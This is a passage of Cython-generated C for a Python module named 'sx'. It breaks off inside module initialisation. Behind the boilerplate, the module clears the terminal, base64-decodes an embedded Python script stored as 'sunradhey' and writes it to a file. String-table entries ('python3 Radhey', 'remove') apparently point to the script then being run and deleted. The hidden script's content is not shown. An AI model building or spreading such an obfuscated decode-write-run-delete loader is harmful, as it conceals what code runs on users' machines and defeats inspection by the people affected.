__attribute__((cold))\n#else\n    #define CYTHON_SMALL_CODE\n#endif\n#endif\n\ntypedef struct {\n  PyObject *__pyx_d;\n  PyObject *__pyx_b;\n  PyObject *__pyx_cython_runtime;\n  PyObject *__pyx_empty_tuple;\n  PyObject *__pyx_empty_bytes;\n  PyObject *__pyx_empty_unicode;\n  #ifdef __Pyx_CyFunction_USED\n  PyTypeObject *__pyx_CyFunctionType;\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  PyTypeObject *__pyx_FusedFunctionType;\n  #endif\n  #ifdef __Pyx_Generator_USED\n  PyTypeObject *__pyx_GeneratorType;\n  #endif\n  #ifdef __Pyx_IterableCoroutine_USED\n  PyTypeObject *__pyx_IterableCoroutineType;\n  #endif\n  #ifdef __Pyx_Coroutine_USED\n  PyTypeObject *__pyx_CoroutineAwaitType;\n  #endif\n  #ifdef __Pyx_Coroutine_USED\n  PyTypeObject *__pyx_CoroutineType;\n  #endif\n  PyObject *__pyx_tuple[2];\n  PyObject *__pyx_string_tab[29];\n\n\nstruct __Pyx_CodeObjectCache __pyx_code_cache;\n\n\n} __pyx_mstatetype;\n\n#if CYTHON_USE_MODULE_STATE\n#ifdef __cplusplus\nnamespace {\nextern struct PyModuleDef __pyx_moduledef;\n} \n#else\nstatic struct PyModuleDef __pyx_moduledef;\n#endif\n\n#define __pyx_mstate_global (__Pyx_PyModule_GetState(__Pyx_State_FindModule(&__pyx_moduledef)))\n\n#define __pyx_m (__Pyx_State_FindModule(&__pyx_moduledef))\n#else\nstatic __pyx_mstatetype __pyx_mstate_global_static =\n#ifdef __cplusplus\n    {};\n#else\n    {0};\n#endif\nstatic __pyx_mstatetype * const __pyx_mstate_global = &__pyx_mstate_global_static;\n#endif\n\n#define __pyx_kp_u_ __pyx_string_tab[0]\n#define __pyx_n_u_D __pyx_string_tab[1]\n#define __pyx_n_u_E __pyx_string_tab[2]\n#define __pyx_kp_u_Radhey __pyx_string_tab[3]\n#define __pyx_kp_b_aW1wb3J0IG9zCmltcG9ydCB0aW1lCmlt __pyx_string_tab[4]\n#define __pyx_n_u_b64decode __pyx_string_tab[5]\n#define __pyx_n_u_base64 __pyx_string_tab[6]\n#define __pyx_n_u_clear __pyx_string_tab[7]\n#define __pyx_n_u_cline_in_traceback __pyx_string_tab[8]\n#define __pyx_n_u_enter __pyx_string_tab[9]\n#define __pyx_n_u_exists __pyx_string_tab[10]\n#define __pyx_n_u_exit __pyx_string_tab[11]\n#define __pyx_n_u_initializing __pyx_string_tab[12]\n#define __pyx_n_u_main __pyx_string_tab[13]\n#define __pyx_n_u_module __pyx_string_tab[14]\n#define __pyx_n_u_name __pyx_string_tab[15]\n#define __pyx_n_u_open __pyx_string_tab[16]\n#define __pyx_n_u_os __pyx_string_tab[17]\n#define __pyx_n_u_path __pyx_string_tab[18]\n#define __pyx_n_u_print __pyx_string_tab[19]\n#define __pyx_kp_u_python3_Radhey __pyx_string_tab[20]\n#define __pyx_n_u_qualname __pyx_string_tab[21]\n#define __pyx_n_u_remove __pyx_string_tab[22]\n#define __pyx_n_u_spec __pyx_string_tab[23]\n#define __pyx_n_u_sunradhey __pyx_string_tab[24]\n#define __pyx_n_u_system __pyx_string_tab[25]\n#define __pyx_n_u_test __pyx_string_tab[26]\n#define __pyx_n_u_wb __pyx_string_tab[27]\n#define __pyx_n_u_write __pyx_string_tab[28]\n\n#if CYTHON_USE_MODULE_STATE\nstatic CYTHON_SMALL_CODE int __pyx_m_clear(PyObject *m) {\n  __pyx_mstatetype *clear_module_state = __Pyx_PyModule_GetState(m);\n  if (!clear_module_state) return 0;\n  Py_CLEAR(clear_module_state->__pyx_d);\n  Py_CLEAR(clear_module_state->__pyx_b);\n  Py_CLEAR(clear_module_state->__pyx_cython_runtime);\n  Py_CLEAR(clear_module_state->__pyx_empty_tuple);\n  Py_CLEAR(clear_module_state->__pyx_empty_bytes);\n  Py_CLEAR(clear_module_state->__pyx_empty_unicode);\n  #ifdef __Pyx_CyFunction_USED\n  Py_CLEAR(clear_module_state->__pyx_CyFunctionType);\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  Py_CLEAR(clear_module_state->__pyx_FusedFunctionType);\n  #endif\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  __Pyx_State_RemoveModule(NULL);\n  #endif\n  for (int i=0; i<2; ++i) { Py_CLEAR(clear_module_state->__pyx_tuple[i]); }\n  for (int i=0; i<29; ++i) { Py_CLEAR(clear_module_state->__pyx_string_tab[i]); }\n  return 0;\n}\n#endif\n\n#if CYTHON_USE_MODULE_STATE\nstatic CYTHON_SMALL_CODE int __pyx_m_traverse(PyObject *m, visitproc visit, void *arg) {\n  __pyx_mstatetype *traverse_module_state = __Pyx_PyModule_GetState(m);\n  if (!traverse_module_state) return 0;\n  Py_VISIT(traverse_module_state->__pyx_d);\n  Py_VISIT(traverse_module_state->__pyx_b);\n  Py_VISIT(traverse_module_state->__pyx_cython_runtime);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_empty_tuple);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_empty_bytes);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_empty_unicode);\n  #ifdef __Pyx_CyFunction_USED\n  Py_VISIT(traverse_module_state->__pyx_CyFunctionType);\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  Py_VISIT(traverse_module_state->__pyx_FusedFunctionType);\n  #endif\n  for (int i=0; i<2; ++i) { __Pyx_VISIT_CONST(traverse_module_state->__pyx_tuple[i]); }\n  for (int i=0; i<29; ++i) { __Pyx_VISIT_CONST(traverse_module_state->__pyx_string_tab[i]); }\n  return 0;\n}\n#endif\n\n\n\nstatic PyMethodDef __pyx_methods[] = {\n  {0, 0, 0, 0}\n};\n\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_InitGlobals(void); \nstatic CYTHON_SMALL_CODE int __Pyx_InitConstants(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_CreateCodeObjects(__pyx_mstatetype *__pyx_mstate); \n\n\nstatic int __Pyx_modinit_global_init_code(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);\n  \n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_variable_export_code(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);\n  \n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_function_export_code(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);\n  \n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_type_init_code(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);\n  \n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_type_import_code(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);\n  \n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_variable_import_code(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);\n  \n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_function_import_code(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);\n  \n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\n#if CYTHON_PEP489_MULTI_PHASE_INIT\nstatic PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); \nstatic int __pyx_pymod_exec_sx(PyObject* module); \nstatic PyModuleDef_Slot __pyx_moduledef_slots[] = {\n  {Py_mod_create, (void*)__pyx_pymod_create},\n  {Py_mod_exec, (void*)__pyx_pymod_exec_sx},\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n  {Py_mod_gil, Py_MOD_GIL_USED},\n  #endif\n  #if PY_VERSION_HEX >= 0x030C0000 && CYTHON_USE_MODULE_STATE\n  {Py_mod_multiple_interpreters, Py_MOD_MULTIPLE_INTERPRETERS_NOT_SUPPORTED},\n  #endif\n  {0, NULL}\n};\n#endif\n\n#ifdef __cplusplus\nnamespace {\n  struct PyModuleDef __pyx_moduledef =\n  #else\n  static struct PyModuleDef __pyx_moduledef =\n  #endif\n  {\n      PyModuleDef_HEAD_INIT,\n      "sx",\n      0, \n    #if CYTHON_USE_MODULE_STATE\n      sizeof(__pyx_mstatetype), \n    #else\n      (CYTHON_PEP489_MULTI_PHASE_INIT) ? 0 : -1, \n    #endif\n      __pyx_methods ,\n    #if CYTHON_PEP489_MULTI_PHASE_INIT\n      __pyx_moduledef_slots, \n    #else\n      NULL, \n    #endif\n    #if CYTHON_USE_MODULE_STATE\n      __pyx_m_traverse, \n      __pyx_m_clear, \n      NULL \n    #else\n      NULL, \n      NULL, \n      NULL \n    #endif\n  };\n  #ifdef __cplusplus\n} \n#endif\n\n\n#ifndef CYTHON_NO_PYINIT_EXPORT\n  #define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC\n#else\n  #ifdef __cplusplus\n  #define __Pyx_PyMODINIT_FUNC extern "C" PyObject *\n  #else\n  #define __Pyx_PyMODINIT_FUNC PyObject *\n  #endif\n#endif\n\n__Pyx_PyMODINIT_FUNC PyInit_sx(void) CYTHON_SMALL_CODE; \n__Pyx_PyMODINIT_FUNC PyInit_sx(void)\n#if CYTHON_PEP489_MULTI_PHASE_INIT\n{\n  return PyModuleDef_Init(&__pyx_moduledef);\n}\n\n#if CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX < 0x03090000\nstatic PY_INT64_T __Pyx_GetCurrentInterpreterId(void) {\n    {\n        PyObject *module = PyImport_ImportModule("_interpreters"); // 3.13+ I think\n        if (!module) {\n            PyErr_Clear(); // just try the 3.8-3.12 version\n            module = PyImport_ImportModule("_xxsubinterpreters");\n            if (!module) goto bad;\n        }\n        PyObject *current = PyObject_CallMethod(module, "get_current", NULL);\n        Py_DECREF(module);\n        if (!current) goto bad;\n        if (PyTuple_Check(current)) {\n            PyObject *new_current = PySequence_GetItem(current, 0);\n            Py_DECREF(current);\n            current = new_current;\n            if (!new_current) goto bad;\n        }\n        long long as_c_int = PyLong_AsLongLong(current);\n        Py_DECREF(current);\n        return as_c_int;\n    }\n  bad:\n    PySys_WriteStderr("__Pyx_GetCurrentInterpreterId failed. Try setting the C define CYTHON_PEP489_MULTI_PHASE_INIT=0\\n");\n    return -1;\n}\n#endif\n#if !CYTHON_USE_MODULE_STATE\nstatic CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {\n    static PY_INT64_T main_interpreter_id = -1;\n#if CYTHON_COMPILING_IN_GRAAL\n    PY_INT64_T current_id = PyInterpreterState_GetIDFromThreadState(PyThreadState_Get());\n#elif CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX >= 0x03090000\n    PY_INT64_T current_id = PyInterpreterState_GetID(PyInterpreterState_Get());\n#elif CYTHON_COMPILING_IN_LIMITED_API\n    PY_INT64_T current_id = __Pyx_GetCurrentInterpreterId();\n#else\n    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);\n#endif\n    if (unlikely(current_id == -1)) {\n        return -1;\n    }\n    if (main_interpreter_id == -1) {\n        main_interpreter_id = current_id;\n        return 0;\n    } else if (unlikely(main_interpreter_id != current_id)) {\n        PyErr_SetString(\n            PyExc_ImportError,\n            "Interpreter change detected - this module can only be loaded into one interpreter per process.");\n        return -1;\n    }\n    return 0;\n}\n#endif\nstatic CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none)\n{\n    PyObject *value = PyObject_GetAttrString(spec, from_name);\n    int result = 0;\n    if (likely(value)) {\n        if (allow_none || value != Py_None) {\n            result = PyDict_SetItemString(moddict, to_name, value);\n        }\n        Py_DECREF(value);\n    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {\n        PyErr_Clear();\n    } else {\n        result = -1;\n    }\n    return result;\n}\nstatic CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def) {\n    PyObject *module = NULL, *moddict, *modname;\n    CYTHON_UNUSED_VAR(def);\n    #if !CYTHON_USE_MODULE_STATE\n    if (__Pyx_check_single_interpreter())\n        return NULL;\n    #endif\n    if (__pyx_m)\n        return __Pyx_NewRef(__pyx_m);\n    modname = PyObject_GetAttrString(spec, "name");\n    if (unlikely(!modname)) goto bad;\n    module = PyModule_NewObject(modname);\n    Py_DECREF(modname);\n    if (unlikely(!module)) goto bad;\n    moddict = PyModule_GetDict(module);\n    if (unlikely(!moddict)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;\n    return module;\nbad:\n    Py_XDECREF(module);\n    return NULL;\n}\n\n\nstatic CYTHON_SMALL_CODE int __pyx_pymod_exec_sx(PyObject *__pyx_pyinit_module)\n#endif\n{\n  int stringtab_initialized = 0;\n  #if CYTHON_USE_MODULE_STATE\n  int pystate_addmodule_run = 0;\n  #endif\n  __pyx_mstatetype *__pyx_mstate = NULL;\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  PyObject *__pyx_t_4 = NULL;\n  PyObject *__pyx_t_5 = NULL;\n  size_t __pyx_t_6;\n  PyObject *__pyx_t_7 = NULL;\n  PyObject *__pyx_t_8 = NULL;\n  PyObject *__pyx_t_9 = NULL;\n  PyObject *__pyx_t_10 = NULL;\n  PyObject *__pyx_t_11 = NULL;\n  PyObject *__pyx_t_12 = NULL;\n  PyObject *__pyx_t_13 = NULL;\n  PyObject *__pyx_t_14 = NULL;\n  PyObject *__pyx_t_15 = NULL;\n  PyObject *__pyx_t_16 = NULL;\n  int __pyx_t_17;\n  int __pyx_t_18;\n  int __pyx_t_19;\n  int __pyx_t_20;\n  char const *__pyx_t_21;\n  PyObject *__pyx_t_22 = NULL;\n  char const *__pyx_t_23;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannyDeclarations\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  if (__pyx_m) {\n    if (__pyx_m == __pyx_pyinit_module) return 0;\n    PyErr_SetString(PyExc_RuntimeError, "Module \'sx\' has already been imported. Re-initialisation is not supported.");\n    return -1;\n  }\n  #else\n  if (__pyx_m) return __Pyx_NewRef(__pyx_m);\n  #endif\n  \n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  __pyx_t_1 = __pyx_pyinit_module;\n  Py_INCREF(__pyx_t_1);\n  #else\n  __pyx_t_1 = PyModule_Create(&__pyx_moduledef); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #if CYTHON_USE_MODULE_STATE\n  {\n    int add_module_result = __Pyx_State_AddModule(__pyx_t_1, &__pyx_moduledef);\n    __pyx_t_1 = 0; \n    if (unlikely((add_module_result < 0))) __PYX_ERR(0, 1, __pyx_L1_error)\n    pystate_addmodule_run = 1;\n  }\n  #else\n  __pyx_m = __pyx_t_1;\n  #endif\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n  PyUnstable_Module_SetGIL(__pyx_m, Py_MOD_GIL_USED);\n  #endif\n  __pyx_mstate = __pyx_mstate_global;\n  CYTHON_UNUSED_VAR(__pyx_t_1);\n  __pyx_mstate->__pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_mstate->__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)\n  Py_INCREF(__pyx_mstate->__pyx_d);\n  __pyx_mstate->__pyx_b = __Pyx_PyImport_AddModuleRef(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_mstate->__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __pyx_mstate->__pyx_cython_runtime = __Pyx_PyImport_AddModuleRef("cython_runtime"); if (unlikely(!__pyx_mstate->__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)\n  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_mstate->__pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  \n  #if CYTHON_REFNANNY\n__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");\nif (!__Pyx_RefNanny) {\n  PyErr_Clear();\n  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");\n  if (!__Pyx_RefNanny)\n      Py_FatalError("failed to import \'refnanny\' module");\n}\n#endif\n\n__Pyx_RefNannySetupContext("PyInit_sx", 0);\n  if (__Pyx_check_binary_version(__PYX_LIMITED_VERSION_HEX, __Pyx_get_runtime_version(), CYTHON_COMPILING_IN_LIMITED_API) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #ifdef __Pxy_PyFrame_Initialize_Offsets\n  __Pxy_PyFrame_Initialize_Offsets();\n  #endif\n  __pyx_mstate->__pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_mstate->__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __pyx_mstate->__pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_mstate->__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __pyx_mstate->__pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_mstate->__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)\n  \n  if (__Pyx_InitConstants(__pyx_mstate) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  stringtab_initialized = 1;\n  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #if 0 || defined(__Pyx_CyFunction_USED) || defined(__Pyx_FusedFunction_USED) || defined(__Pyx_Coroutine_USED) || defined(__Pyx_Generator_USED) || defined(__Pyx_AsyncGen_USED)\n  if (__pyx_CommonTypesMetaclass_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_CyFunction_USED\n  if (__pyx_CyFunction_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  if (__pyx_FusedFunction_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_Coroutine_USED\n  if (__pyx_Coroutine_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_Generator_USED\n  if (__pyx_Generator_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_AsyncGen_USED\n  if (__pyx_AsyncGen_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  \n  if (__pyx_module_is_main_sx) {\n    if (PyObject_SetAttr(__pyx_m, __pyx_mstate_global->__pyx_n_u_name, __pyx_mstate_global->__pyx_n_u_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  }\n  {\n    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)\n    if (!PyDict_GetItemString(modules, "sx")) {\n      if (unlikely((PyDict_SetItemString(modules, "sx", __pyx_m) < 0))) __PYX_ERR(0, 1, __pyx_L1_error)\n    }\n  }\n  \n  if (__Pyx_InitCachedBuiltins(__pyx_mstate) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  \n  if (__Pyx_InitCachedConstants(__pyx_mstate) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  if (__Pyx_CreateCodeObjects(__pyx_mstate) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  \n  (void)__Pyx_modinit_global_init_code(__pyx_mstate);\n  (void)__Pyx_modinit_variable_export_code(__pyx_mstate);\n  (void)__Pyx_modinit_function_export_code(__pyx_mstate);\n  (void)__Pyx_modinit_type_init_code(__pyx_mstate);\n  (void)__Pyx_modinit_type_import_code(__pyx_mstate);\n  (void)__Pyx_modinit_variable_import_code(__pyx_mstate);\n  (void)__Pyx_modinit_function_import_code(__pyx_mstate);\n  \n\n  \n  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_base64, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 2, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_base64, __pyx_t_2) < 0) __PYX_ERR(0, 2, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_os, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_os, __pyx_t_2) < 0) __PYX_ERR(0, 3, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __pyx_t_3 = NULL;\n  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 4, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_4);\n  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n  __pyx_t_6 = 1;\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_mstate_global->__pyx_n_u_clear};\n    __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n  }\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_sunradhey, __pyx_mstate_global->__pyx_kp_b_aW1wb3J0IG9zCmltcG9ydCB0aW1lCmlt) < 0) __PYX_ERR(0, 6, __pyx_L1_error)\n\n  \n   {\n    {\n      __Pyx_PyThreadState_declare\n      __Pyx_PyThreadState_assign\n      __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_7, &__pyx_t_8);\n      __Pyx_XGOTREF(__pyx_t_1);\n      __Pyx_XGOTREF(__pyx_t_7);\n      __Pyx_XGOTREF(__pyx_t_8);\n       {\n\n        \n         {\n          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_mstate_global->__pyx_tuple[0], NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_2);\n          __pyx_t_9 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_exit); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 8, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_9);\n          __pyx_t_3 = NULL;\n          __pyx_t_4 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_enter); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 8, __pyx_L11_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __pyx_t_6 = 1;\n          {\n            PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};\n            __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+__pyx_t_6, (1-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n            if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 8, __pyx_L11_error)\n            __Pyx_GOTREF(__pyx_t_5);\n          }\n          __pyx_t_4 = __pyx_t_5;\n          __pyx_t_5 = 0;\n          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n           {\n            {\n              __Pyx_PyThreadState_declare\n              __Pyx_PyThreadState_assign\n              __Pyx_ExceptionSave(&__pyx_t_10, &__pyx_t_11, &__pyx_t_12);\n              __Pyx_XGOTREF(__pyx_t_10);\n              __Pyx_XGOTREF(__pyx_t_11);\n              __Pyx_XGOTREF(__pyx_t_12);\n               {\n                if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_D, __pyx_t_4) < 0) __PYX_ERR(0, 8, __pyx_L15_error)\n                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n\n                \n                __pyx_t_2 = NULL;\n                __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_mstate_global->__pyx_n_u_D); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 9, __pyx_L15_error)\n                __Pyx_GOTREF(__pyx_t_5);\n                __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_mstate_global->__pyx_n_u_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 9, __pyx_L15_error)\n                __Pyx_GOTREF(__pyx_t_3);\n                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n                __pyx_t_13 = NULL;\n                __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_mstate_global->__pyx_n_u_base64); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 9, __pyx_L15_error)\n                __Pyx_GOTREF(__pyx_t_14);\n                __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_mstate_global->__pyx_n_u_b64decode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 9, __pyx_L15_error)\n                __Pyx_GOTREF(__pyx_t_15);\n                __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;\n                __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_mstate_global->__pyx_n_u_sunradhey); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 9, __pyx_L15_error)\n                __Pyx_GOTREF(__pyx_t_14);\n                __pyx_t_6 = 1;\n                {\n                  PyObject *__pyx_callargs[2] = {__pyx_t_13, __pyx_t_14};\n                  __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_15, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n                  __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;\n                  __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;\n             